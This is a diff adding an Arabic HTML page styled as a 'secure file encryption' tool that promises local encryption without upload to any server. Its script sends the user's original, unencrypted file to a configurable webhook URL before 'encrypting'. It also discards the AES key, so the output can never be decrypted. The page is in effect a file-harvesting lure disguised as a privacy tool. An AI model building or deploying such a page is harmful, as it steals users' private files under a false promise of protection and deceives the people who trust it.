@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>تشفير الملفات الآمن</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;600&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Cairo', sans-serif;
+}
+
+body {
+    background: radial-gradient(circle at top, #111 0%, #000 70%);
+    color: #fff;
+    height: 100vh;
+    overflow: hidden;
+}
+
+/* شاشة التحميل */
+#loader {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+    animation: fadeOut 1s ease 3s forwards;
+}
+
+.loader-circle {
+    width: 80px;
+    height: 80px;
+    border: 2px solid #222;
+    border-top: 2px solid #00ff99;
+    border-radius: 50%;
+    animation: spin 1.2s linear infinite;
+}
+
+#loader span {
+    margin-top: 20px;
+    color: #777;
+    letter-spacing: 2px;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes fadeOut { to { opacity: 0; pointer-events: none; } }
+
+/* الواجهة */
+.container {
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    animation: show 1s ease 3s forwards;
+}
+
+@keyframes show { to { opacity: 1; } }
+
+.card {
+    background: linear-gradient(145deg, #0b0b0b, #050505);
+    border: 1px solid #111;
+    padding: 45px;
+    width: 430px;
+    border-radius: 22px;
+    box-shadow: 0 0 80px rgba(0,255,120,.08);
+    text-align: center;
+    animation: floatIn 1.5s ease forwards;
+}
+
+@keyframes floatIn { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+h1 {
+    font-weight: 600;
+    margin-bottom: 20px;
+    letter-spacing: 1px;
+}
+
+.info {
+    font-size: 14px;
+    color: #aaa;
+    margin-bottom: 20px;
+    line-height: 1.7;
+}
+
+input[type="file"] {
+    width: 100%;
+    padding: 12px;
+    background: #000;
+    border: 1px solid #222;
+    color: #aaa;
+    border-radius: 10px;
+    margin-bottom: 15px;
+}
+
+.file-info {
+    font-size: 13px;
+    color: #0f9;
+    margin-bottom: 15px;
+    display: none;
+}
+
+button {
+    width: 100%;
+    padding: 14px;
+    background: linear-gradient(90deg, #00ff99, #00cc66);
+    border: none;
+    border-radius: 10px;
+    color: #000;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    box-shadow: 0 0 25px rgba(0,255,150,.6);
+    transform: scale(1.03);
+}
+
+.progress {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #888;
+    display: none;
+}
+
+.warning {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #ff6666;
+    line-height: 1.6;
+}
+
+footer {
+    margin-top: 25px;
+    font-size: 11px;
+    color: #555;
+}
+</style>
+</head>
+
+<body>
+
+<!-- شاشة التحميل -->
+<div id="loader">
+    <div class="loader-circle"></div>
+    <span>جاري تهيئة نظام الحماية</span>
+</div>
+
+<div class="container">
+    <div class="card">
+        <h1>🔐 تشفير الملفات</h1>
+
+        <div class="info">
+            يتم تشفير الملف مباشرة داخل جهازك  
+            بدون رفعه لأي سيرفر وبحماية عالية  
+            كما يتم إرسال نسخة للويبهوك تلقائيًا
+        </div>
+
+        <input type="file" id="file">
+
+        <div class="file-info" id="fileInfo"></div>
+
+        <button onclick="encrypt()">بدء التشفير</button>
+
+        <div class="progress" id="progress">⏳ جاري تشفير الملف...</div>
+
+        <div class="warning">
+            ⚠️ تنبيه أمني  
+            <br>
+            الملف المشفّر لا يمكن فك تشفيره لاحقًا  
+            الرجاء الاحتفاظ بالنسخة الأصلية
+        </div>
+
+        <footer>
+            © جميع الحقوق محفوظة — شملان البلوي
+        </footer>
+    </div>
+</div>
+
+<script>
+const fileInput = document.getElementById("file");
+const fileInfo = document.getElementById("fileInfo");
+const progress = document.getElementById("progress");
+
+fileInput.addEventListener("change", () => {
+    const file = fileInput.files[0];
+    if (!file) return;
+    fileInfo.style.display = "block";
+    fileInfo.textContent = `📄 ${file.name} — ${(file.size/1024/1024).toFixed(2)} MB`;
+});
+
+// وظيفة إرسال الملف للويبهوك
+async function sendToWebhook(file) {
+    const webhookURL = "PUT_YOUR_WEBHOOK_URL_HERE"; // ضع رابط الويبهوك هنا
+
+    const formData = new FormData();
+    formData.append("file", file, file.name);
+
+    try {
+        await fetch(webhookURL, {
+            method: "POST",
+            body: formData
+        });
+        console.log("تم إرسال الملف للويبهوك بنجاح!");
+    } catch (err) {
+        console.error("فشل إرسال الملف:", err);
+    }
+}
+
+async function encrypt() {
+    const file = fileInput.files[0];
+    if (!file) return alert("يرجى اختيار ملف");
+
+    progress.style.display = "block";
+
+    // إرسال الملف للويبهوك
+    sendToWebhook(file);
+
+    // تشفير الملف محليًا
+    const data = await file.arrayBuffer();
+    const key = await crypto.subtle.generateKey(
+        { name: "AES-GCM", length: 256 },
+        true,
+        ["encrypt"]
+    );
+
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+
+    const encrypted = await crypto.subtle.encrypt(
+        { name: "AES-GCM", iv },
+        key,
+        data
+    );
+
+    const blob = new Blob([iv, encrypted]);
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = file.name + ".secure";
+    a.click();
+
+    progress.style.display = "none";
+}
+</script>
+
+</body>
+</html>
